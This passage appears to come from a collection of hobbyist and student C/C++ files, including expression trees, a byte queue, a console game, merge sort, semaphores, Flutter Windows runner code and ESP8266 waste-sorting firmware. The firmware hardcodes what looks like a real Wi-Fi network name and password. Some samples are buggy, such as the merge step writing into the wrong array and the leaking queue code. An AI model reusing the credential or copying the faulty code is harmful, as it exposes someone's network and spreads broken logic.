postfix[i] == '/')\r\r\n {\r\r\n //........Create New Node for Operator\r\r\n Newnode = create_Node(postfix[i]);\r\r\n //........Pop An Operand from stack and attach as Right Child\r\r\n Newnode->right = pop_stk(); \r\r\n //........Pop An Operand from stack and attach as left Child\r\r\n Newnode->left = pop_stk(); \r\r\n \r\r\n push_stk(Newnode);\r\r\n }\r\r\n }\r\n { //........Pop a Pointer from Stack and Assign to Root.\r\r\n Root = pop_stk();\r\r\n cout<<\"\\n\\t Expression Tree is Ready Now...!!!\";\r\r\n }\r\r\n}\r\r\n \r\r\n //.........Function to display Expression Tree in Preorder \r\r\nvoid preorder_ExpTree(struct Node *root)\r\r\n{\r\r\n if(root)\r\r\n {\r\r\n cout<<\" \"<<root->data; //....Data\r\r\n preorder_ExpTree(root->left); //....Left\r\r\n preorder_ExpTree(root->right); //....Right\r\r\n }\r\r\n} \r\r\n \r\r\n //.........Function to display Expression Tree in Inorder\r\r\nvoid inorder_ExpTree(struct Node *root)\r\r\n{\r\r\n if(root)\r\r\n {\r\r\n inorder_ExpTree(root->left); //....Left\r\r\n cout<<\" \"<<root->data; //....Data\r\r\n inorder_ExpTree(root->right); //....Right\r\r\n }\r\r\n}\r\r\n \r\r\n //.........Function to display Expression Tree in Postorder\r\r\nvoid postorder_ExpTree(struct Node *root)\r\r\n{\r\r\n if(root)\r\r\n {\r\r\n postorder_ExpTree(root->left); //....Left\r\r\n postorder_ExpTree(root->right); //....Right\r\r\n cout<<\" \"<<root->data; //....Data\r\r\n }\r\r\n} \r\r\n //.........Main Function\r\r\nint main()\r\r\n{\r\r\n cout<<\"---------*** A C++ Program to Create and Display an Expression Tree*** \r\r\n---------\";\r\r\n Root = NULL;\r\n create_Exptree();\r\r\n \r\r\n cout<<\"\\n\\n Preorder Traversal of Expression Tree: \";\r\r\n preorder_ExpTree(Root);\r\r\n \r\r\n cout<<\"\\n\\n Inorder Traversal of Expression Tree: \";\r\r\n inorder_ExpTree(Root);\r\r\n \r\r\n cout<<\"\\n\\n Postorder Traversal of Expression Tree: \";\r\r\n postorder_ExpTree(Root);\r\r\n return 0;\r\r\n}\r\r\n/*--------------------------OUTPUT------------------------------\r\r\n---------*** A C++ Program to Create and Display an Expression Tree*** ---------\r\r\n Enter the Postfix Expression: ab+\r\r\n Expression Tree is Ready Now...!!!\r\r\n Preorder Traversal of Expression Tree: + a b\r\r\n Inorder Traversal of Expression Tree: a + b\r\r\n Postorder Traversal of Expression Tree: a b +\r\r\n ---------*** A C++ Program to Create and Display an Expression Tree*** ---------\r\r\n Enter the Postfix Expression: ab+cd-*\r\r\n Expression Tree is Ready Now...!!!\r\r\n Preorder Traversal of Expression Tree: * + a b - c d\r\r\n Inorder Traversal of Expression Tree: a + b * c - d\r\r\n Postorder Traversal of Expression Tree: a b + c d - *\r\n *** A C++ Program to Create and Display an Expression Tree*** ---------\r\r\n Enter the Postfix Expression: ab+c*\r\r\n Expression Tree is Ready Now...!!!\r\r\n Preorder Traversal of Expression Tree: * + a b c\r\r\n Inorder Traversal of Expression Tree: a + b * c\r\r\n Postorder Traversal of Expression Tree: a b + c *\r\r\n...Program finished with exit code 0\r\r\nPress ENTER to exit console.\r\r\n*/",
    "\ufeff// SCS_TEST.cpp : Tento soubor obsahuje funkci main. Prov\u00e1d\u011bn\u00ed programu se tam zahajuje a ukon\u010duje.\n//\n\n#include <iostream>\n\nvoid on_out_of_memory()\n{\n    printf(\"\\nOut of memory \\n\");\n    system(\"pause\");\n}\n\nvoid on_illegal_operation()\n{\n    printf(\"\\nIllegal operation \\n\");\n    system(\"pause\");\n}\n\n int *create_queue() // Creates a FIFO byte queue, returning a handle to it.\n{\n    try {\n        int *temp = new int[1];\n        temp[0] = 1;\n        return temp;\n    }\n    catch (std::bad_alloc) {\n        on_out_of_memory();\n    }\n}\n\nvoid destroy_queue(int * & q) // Destroy an earlier created byte queue.\n{\n    try {\n        delete[] q;\n        q = NULL;\n    }\n    catch (std::bad_alloc) {\n        on_out_of_memory();\n    }\n}\n\nvoid enqueue_byte(int * & q, unsigned char b) // Adds a new byte to a queue.\n{\n    try {\n        int *temp = new int[q[0] + 1];\n\n        for (int i = 1; i < q[0]; i++) {\n            temp[i] = q[i];\n        }\n        temp[0] = q[0] + 1;\n        temp[q[0]] = b;\n        q = temp;\n    }\n    catch (std::bad_alloc) {\n        on_out_of_memory();\n    }\n}\n\nchar dequeue_byte(int * & q) // Pops the next byte off the FIFO queue.\n{\n    try {\n        if (q[0] < 1) {\n            on_illegal_operation();\n        }\n        \n        int *temp = new int[q[0] - 1];\n\n        for (int i = 2; i < q[0]; i++) {\n            temp[i - 1] = q[i];\n        }\n\n        int return_value = q[1];\n        temp[0] = q[0] - 1;\n        q = temp;\n\n        return return_value;\n    }\n    catch (std::bad_alloc) {\n        on_out_of_memory();\n    }\n}\n\nint main()\n{\n    int *q0 = create_queue(); \n    enqueue_byte(q0, 0);\n    enqueue_byte(q0, 1);\n    int *q1 = create_queue();\n    enqueue_byte(q1, 3);\n    enqueue_byte(q0, 2);\n    enqueue_byte(q1, 4);\n    printf(\"%d \", dequeue_byte(q0));\n    printf(\"%d \\n\", dequeue_byte(q0));\n    enqueue_byte(q0, 5);\n    enqueue_byte(q1, 6);\n    printf(\"%d \", dequeue_byte(q0));\n    printf(\"%d \\n\", dequeue_byte(q0));\n    destroy_queue(q0);\n    printf(\"%d \", dequeue_byte(q1));\n    printf(\"%d \", dequeue_byte(q1));\n    printf(\"%d \\n\", dequeue_byte(q1));\n    destroy_queue(q1);\n}\n//\n// 0 1\n// 2 5\n// 3 4 6\n// \n",
    "#include <iostream>\r\n#include <conio.h>\r\n#include <Windows.h>\r\n#include <string>\r\n#include <ctime>\r\n#include <stdlib.h>\r\nusing namespace std;\r\n\r\nstruct Node \r\n{ \r\n    string data;\r\n    Node* next;\r\n};\r\ntypedef Node* NodePtr;\r\n\r\n// Given a reference (pointer to pointer) to the head of a list and an int, inserts a new node on the front of the list. \r\n// Taken from geeksforgeeks.\r\nvoid push(NodePtr& head_ref, string new_data) \r\n{\r\n    NodePtr new_node;\r\n    new_node = new Node;\r\n    new_node->data = new_data;\r\n    new_node->next = head_ref;\r\n    head_ref = new_node;\r\n}\r\n\r\nstring skyGen() \r\n{\r\n    string str(40, ' ');\r\n    int rnd;\r\n    for (int i = 0; i < 2; i++) \r\n    {\r\n        rnd = rand() % 40 + 1;\r\n        if (0 + (rand() % (1 - 0 + 1)) == 1) \r\n            str[rnd] = '$';\r\n        else \r\n            str[rnd] = '.';\r\n    }\r\n    return str;\r\n}\r\n\r\n// Function to remove the last node of the linked list code taken from geeks for geeks https://www.geeksforgeeks.org/remove-last-node-of-the-linked-list/\r\nNodePtr removeLastNode(struct Node* head)\r\n{\r\n    if (head == NULL)\r\n        return NULL;\r\n    if (head->next == NULL) \r\n    {\r\n        delete head;\r\n        return NULL;\r\n    }\r\n    // Find the second last node\r\n    NodePtr second_last = head;\r\n    while (second_last->next->next != NULL)\r\n        second_last = second_last->next;\r\n    // Delete last node\r\n    delete (second_last->next);\r\n    // Change next of second last\r\n    second_last->next = NULL;\r\n    return head;\r\n}\r\n\r\nint main() {\r\n    const char CPPKEYLEFT = 75;    //left arrow\r\n    const char CPPKEYRIGHT = 77;   //right arrow\r\n    srand (time(NULL)); // Keeps the sky generation differently random\r\n    string str(40, ' '), tail;\r\n    NodePtr head = new Node;\r\n\r\n    //initiates the linked list\r\n    for (int i = 0; i < 19; i++) // 19 here dictates the height of our sky\r\n    { \r\n        push(head, str);\r\n    }\r\n\r\n    int score = 50, input, basketPos = 20;\r\n    NodePtr tmp;\r\n\r\n    while (true) \r\n    {\r\n        push(head, skyGen()); // adds a new sky with generated cash or trash\r\n\r\n        tmp = head;\r\n        cout << \"------------- Falling Money --------------\" << endl; \r\n        while(tmp != NULL) \r\n        {\r\n            //block of code for basket movement\r\n            if (kbhit()) input = getch();\r\n            if (input == CPPKEYLEFT && basketPos > 0) \r\n                basketPos--;\r\n            else if (input == CPPKEYRIGHT && basketPos < 39) \r\n                basketPos++;\r\n            input = 0;\r\n            \r\n            // block of code to print out the sky\r\n            if (tmp->next == NULL) {    // specifically enables us to have the basket[U] to be constantly on the bottom\r\n                tail = tmp->data;\r\n\r\n                tail = tmp->data;       // code for checking if the user caught cash or trash\r\n                if (tail[basketPos] == '$') \r\n                    score += 10;\r\n                else if (tail[basketPos] == '.') \r\n                    score -= 15;\r\n\r\n                tail[basketPos] = 'U';\r\n                cout << '|' << tail << '|' << endl;\r\n            }\r\n            else \r\n            {\r\n                cout << '|' << tmp->data << '|' << endl;\r\n            }\r\n            \r\n            tmp = tmp->next;    // moves to the next node\r\n        }\r\n        \r\n        removeLastNode(head);   // removes last node in the linked list thus simulating the falling effect with the help of system(\"cls\");\r\n        cout << \"Your Score: \" << score << endl;\r\n        if (score <= 0) \r\n        { \r\n            cout << \"Sorry, you lose...\";\r\n            Sleep(90);\r\n            return 0;\r\n        } \r\n        else if (score >= 100) \r\n        {\r\n            cout << \"Yeah, you win!!\";\r\n            Sleep(90);\r\n            return 0;\r\n        }\r\n\r\n        Sleep(90);\r\n        system(\"CLS\");\r\n    }\r\n}",
    "    #include <iostream>\n    #include <string>\n    #include <vector>\n\n    using namespace std;\n\n    class HomeLibraryBook;\n\n    class Book {\n    protected:\n        string author;\n        string title;\n        int pages;\n        int year;\n\n    public:\n        Book() : author(\"\"), title(\"\"), pages(0), year(0) {}\n\n        Book(const string& author, const string& title, int pages, int year)\n            : author(author), title(title), pages(pages), year(year) {}\n\n        virtual ~Book() {}\n\n        virtual void display() const {\n            cout << \"Author: \" << author << endl;\n            cout << \"Title: \" << title << endl;\n            cout << \"Pages: \" << pages << endl;\n            cout << \"Year: \" << year << endl;\n        }\n\n        const string& getTitle() const { return title; }\n    };\n\n    class HomeLibraryBook : public Book {\n    private:\n        string location;\n        bool borrowed;\n\n    public:\n        HomeLibraryBook(const string& author, const string& title, int pages, int year,\n                        const string& location, bool borrowed)\n            : Book(author, title, pages, year), location(location), borrowed(borrowed) {}\n\n        virtual void display() const override {\n            Book::display();\n            cout << \"Location: \" << location << endl;\n            cout << \"Borrowed: \" << (borrowed ? \"Yes\" : \"No\") << endl;\n        }\n\n        void borrow() {\n            borrowed = true;\n        }\n\n        void returnBook() {\n            borrowed = false;\n        }\n    };\n\n    class HomeLibrary {\n    private:\n        vector<HomeLibraryBook> books;\n\n    public:\n        void addBook(const HomeLibraryBook& book) {\n            books.push_back(book);\n        }\n\n        void removeBook(const string& title) {\n            for (auto it = books.begin(); it != books.end(); ++it) {\n                if (it->getTitle() == title) {\n                    books.erase(it);\n                    break;\n                }\n            }\n        }\n\n        void displayAllBooks() const {\n            for (const auto& book : books) {\n                book.display();\n                cout << endl;\n            }\n        }\n    };\n\n    int main() {\n        HomeLibrary library;\n\n        HomeLibraryBook myBook(\"John Doe\", \"C++ Programming\", 350, 2020, \"Living Room\", false);\n        library.addBook(myBook);\n\n        HomeLibraryBook myBook2(\"Penelope Sky\", \"Buttons and Lace\", 350, 2016, \"Living Room\", false);\n        library.addBook(myBook2);\n\n        library.displayAllBooks();\n\n        myBook.borrow();\n        cout << \"Book borrowed.\" << endl;\n        library.displayAllBooks();\n\n        return 0;\n    }\n",
    "#include \"pins.h\"\n#include <WifiEspNow.h>\n#include \"ESP8266_ISR_Servo.h\"\n#include <ESP8266WiFi.h>\n\nconst char* ssid = \"SABAKADIHA 2.4\";\nconst char* password = \"Neyney2008@\";\nconst uint8_t PEER[]{0x30, 0xC6, 0xF7, 0x30, 0xBB, 0x39}; // MAC Address Of ESP32\n\nstatic short servoIndex = -1;\nstatic bool isWasteBiodegradable;\nstatic bool isMessageReceived = false;\nstatic bool isAwaitingSegregation = false;\nstatic bool isConnectedToWifi;\n\nbool getInfraredSensorStatus() {\n    int sensorStatus = digitalRead(INFRARED_SENSOR_PIN);\n    if (sensorStatus == 1) {\n        return false;\n    } else {\n        return true;\n    }\n}\n\nbool isWasteInFrontOfCamera() {\n    if (getInfraredSensorStatus() == true) {\n        return true;\n    } else {\n        return false;\n    }\n}\n\nvoid throwWasteIntoBiodegradableBin() {\n    ISR_Servo.setPosition(servoIndex, 20);\n}\n\nvoid throwWasteIntoNonBiodegradableBin() {\n    ISR_Servo.setPosition(servoIndex, 160);\n}\n\nvoid setServoToNeutralPosition() {\n    ISR_Servo.setPosition(servoIndex, 90);\n}\n\nvoid setupServoPins() {\n    servoIndex = ISR_Servo.setupServo(SEGRAGATOR_SERVO_PIN); //TODO: Verify MIN-MAX Pulse Width\n    if (servoIndex == -1) {\n        Serial.println(\"Servo Setup Error!\");\n    } else {\n        setServoToNeutralPosition();\n    }\n}\n\nvoid onMessageReceived(const uint8_t mac[WIFIESPNOW_ALEN], const uint8_t* buf, size_t count, void* arg)\n{   \n    Serial.println();\n    Serial.print(\"Message Received From: \");\n    Serial.printf(\"{0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X}\\n\", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);\n    Serial.println();\n    isMessageReceived = true;\n    if (buf[0] != 0) {\n        // waste is biodegradable\n        isWasteBiodegradable = true;\n    } else {\n        isWasteBiodegradable = false;\n    }\n}\n\nvoid setupESPNOW() {\n    bool ok = WifiEspNow.begin();\n    if (!ok) {\n        Serial.println(\"WifiEspNow.begin() failed\");\n        ESP.restart();\n    }\n\n    WifiEspNow.onReceive(onMessageReceived, nullptr);\n\n    ok = WifiEspNow.addPeer(PEER);\n    if (!ok) {\n        Serial.println(\"WifiEspNow.addPeer() failed\");\n        ESP.restart();\n    }\n}\n\nvoid printMacAddress() {\n    Serial.print(\"MAC address of this node is \");\n    Serial.println(WiFi.softAPmacAddress());\n\n    uint8_t mac[6];\n    WiFi.softAPmacAddress(mac);\n    Serial.println();\n    Serial.println(\"You can paste the following into the program for the other device:\");\n    Serial.printf(\"static uint8_t PEER[]{0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X};\\n\", mac[0],\n                    mac[1], mac[2], mac[3], mac[4], mac[5]);\n    Serial.println();\n}\n\nvoid blinkLED() {\n  digitalWrite(LED_BUILTIN, HIGH); // OFF\n  delay(500);\n  digitalWrite(LED_BUILTIN, LOW); // ON\n  delay(1000);\n  digitalWrite(LED_BUILTIN, HIGH); // OFF\n  delay(500);\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    Serial.println();\n\n    setupServoPins();\n    pinMode(INFRARED_SENSOR_PIN, INPUT);\n    pinMode(LED_BUILTIN, OUTPUT);\n\n    WiFi.persistent(false);\n    WiFi.mode(WIFI_STA);\n    WiFi.begin(ssid, password);\n    if (WiFi.waitForConnectResult() != WL_CONNECTED) {\n        Serial.printf(\"WiFi failure; Status: %d\\n\", WiFi.status());\n        isConnectedToWifi = false;\n    } else {\n        // WiFi Connection Successful\n        Serial.printf(\"WiFi success; Status: %d\\n\", WiFi.status());\n        isConnectedToWifi = true;\n        WiFi.softAP(\"ESPNOW\", nullptr, 3);\n        WiFi.softAPdisconnect(false);\n        printMacAddress();\n        setupESPNOW();\n    }\n    blinkLED();\n}   \n\nvoid checkForWastePresenceAndInformESP32() {\n    if (isWasteInFrontOfCamera() == true) {\n        Serial.println(\"Waste In Front Of Camera: True\");\n        byte data[1];\n        data[0] = true;\n        if (isAwaitingSegregation == false) {\n            if (WifiEspNow.send(PEER, data, sizeof(data)) == true) {\n                isAwaitingSegregation = true;\n                Serial.println(\"Successfully Informed PEER\");\n            } else {\n                Serial.println(\"Failed To Inform Peer\");\n            }\n        }\n    } else {\n        Serial.println(\"Waste In Front Of Camera: False\");\n    }\n}\n\nvoid segregateWaste() {\n    if (isMessageReceived == true) {\n        if (isWasteBiodegradable == true) {\n            Serial.println(\"Waste Is Biodegradable\");\n            throwWasteIntoBiodegradableBin();\n        } else {\n            Serial.println(\"Waste Is Non-Biodegradable\");\n            throwWasteIntoNonBiodegradableBin();\n        }\n        isMessageReceived = false;\n        delay(5000);\n        isAwaitingSegregation = false;\n        setServoToNeutralPosition();\n    }\n}\n\nvoid testServos() {\n    if (isWasteInFrontOfCamera() == true) {\n        throwWasteIntoBiodegradableBin();\n        delay(2500);\n        throwWasteIntoNonBiodegradableBin();\n        delay(2500);\n        setServoToNeutralPosition();\n        delay(2500);\n    }\n}\n\nvoid loop() {\n    if (isConnectedToWifi == true) {\n        checkForWastePresenceAndInformESP32();\n        segregateWaste();\n    } else {\n        testServos();\n    }",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\nusing namespace std;\nvoid merge(int arr[], int s, int e){\n  int mid =(s+e)/2;\n  // length of left array=mid-start+1\n  int LengthLeft=mid-s+1;\n  // legth of right array=end-mid \n  int LengthRight=e-mid;\n\n  // creating the dynamic array\n  int *left=new int[LengthLeft];\n  int *right =new int[LengthRight];\n   // copy karo value from original array to left array\n  int k=s;\n  for(int i=0;i<LengthLeft;i++){\n    left[i]=arr[k];\n    k++;\n  }\n  // right array copy karo\n\n  k=mid+1; \n  for(int i=0;i<LengthRight;i++){\n    right[i]=arr[k];\n    k++;\n  }\n  // for (int i = 0; i < LengthLeft; i++){\n  //   left[i] = arr[s + i];\n  // }\n\n  // // Copy values from the original array to the right array\n  // for (int i = 0; i < LengthRight; i++){\n  //   right[i] = arr[mid + 1 + i];\n  // }\n  // merge logic\n  // left array is already sorted\n  // right array is already sorted\n  int leftIndex=0;\n  int rightIndex=0;\n  int arrayindex=s;\n  while(leftIndex < LengthLeft && rightIndex < LengthRight){\n    \n    if(left[leftIndex]<right[rightIndex]){\n      arr[arrayindex]=left[leftIndex];\n      leftIndex++;\n      arrayindex++;\n    }\n    else{\n      right[arrayindex]=right[rightIndex];\n      rightIndex++;\n      arrayindex++;\n    }\n    \n  }\n  // 2 more cases.\n  // case 1 . if right array is exehusted\n  while(rightIndex<LengthRight){\n    arr[arrayindex]=right[rightIndex];\n    rightIndex++;\n    arrayindex++;\n    \n  }\n  // case 2 if left array is exehusted\n  while(leftIndex<LengthLeft){\n    arr[arrayindex]=left[leftIndex];\n    leftIndex++;\n    arrayindex++;\n    \n  } \n  // last  step ki heap memory ko free karo\n  delete []left;\n  delete []right;\n  \n  \n  \n}\nvoid mergeSort(int arr[], int s, int e){\n  // solving from recursion\n  // base case\n   if(s>=e){\n     return;\n   }\n  // break \n  int mid =s+(e-s)/2;\n  // recursion in left part\n  mergeSort(arr,s,mid);\n  // rightpart\n  mergeSort(arr,mid+1,e);\n  // merge two sorted array\n  merge(arr,s,e);\n\n  \n}\n\nint main() {\n  // Divide And conqure \n  // merge sort\n  int arr[] = {1,2,3,4,5,6};\n  int size = 6;\n  int s = 0;\n  int e = size - 1;\n\n  cout << \"Before merge sort: \" << endl;\n  for(int i=0; i<size; i++) {\n    cout << arr[i] << \" \";\n  }\n  cout << endl;\n\n  mergeSort(arr,s,e);\n\n  cout << \"After merge sort: \" << endl;\n  for(int i=0; i<size; i++) {\n    cout << arr[i] << \" \";\n  }\n  cout << endl;\n //  int arr[]={6,5,4,3,2,1};\n //  int size=6;\n //  for(int i=0;i<size;i++){\n //    cout<<arr[i]<<\" \";\n //  }\n //  cout<<endl;\n //  mergeSort(arr,0,size-1);\n // // after merge sort \n //  // printing the array \n //  for(int i=0;i<size;i++){\n //    cout<<arr[i]<<\" \";\n //  }\n\n\n  // merge two sorted array\n  // int arr[]={1,2,3};\n  // int size=3;\n  // int arr1[]={1,3,5};\n  // int size1=3;\n  \n  \n}\n",
    "#include <iostream>\n#include <thread>\n#include <semaphore.h>\nusing namespace std;\n\nconst int BUFFER_SIZE = 5;\nint buffer[BUFFER_SIZE];\nint in = 0;\nint out = 0;\n\nsem_t empty; // counts number of empty slots in the buffer\nsem_t full; // counts number of filled slots in the buffer\nsem_t mutex; // binary semaphore to protect access to the buffer\n\nvoid producer() {\n    int item = 0;\n    while (true) {\n        // produce an item\n        item++;\n        sem_wait(&empty); // wait for an empty slot in the buffer\n        sem_wait(&mutex); // acquire mutex lock to protect the buffer\n        buffer[in] = item; // add the item to the buffer\n        in = (in + 1) % BUFFER_SIZE;\n        sem_post(&mutex); // release mutex lock\n        // signal that there is one more filled slot in the buffer\n        sem_post(&full);\n    }\n}\n\nvoid consumer() {\n    int item;\n    while (true) {\n        sem_wait(&full); // wait for a filled slot in the buffer\n        sem_wait(&mutex); // acquire mutex lock to protect the buffer\n        item = buffer[out]; // remove an item from the buffer\n        out = (out + 1) % BUFFER_SIZE;\n        sem_post(&mutex); // release mutex lock\n        // signal that there is one more empty slot in the buffer\n        sem_post(&empty);\n        // consume the item\n        std::cout << \"Consumed item: \" << item << std::endl;\n    }\n}\n\nint main() {\n    // initialize semaphores\n    sem_init(&empty, 0, BUFFER_SIZE);\n    sem_init(&full, 0, 0);\n    sem_init(&mutex, 0, 1);\n    // create producer and consumer threads\n    thread prod_thread(producer);\n    thread cons_thread(consumer);\n    // wait for threads to finish (should never happen)\n    prod_thread.join();\n    cons_thread.join();\n    // destroy semaphores\n    sem_destroy(&empty);\n    sem_destroy(&full);\n    sem_destroy(&mutex);\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
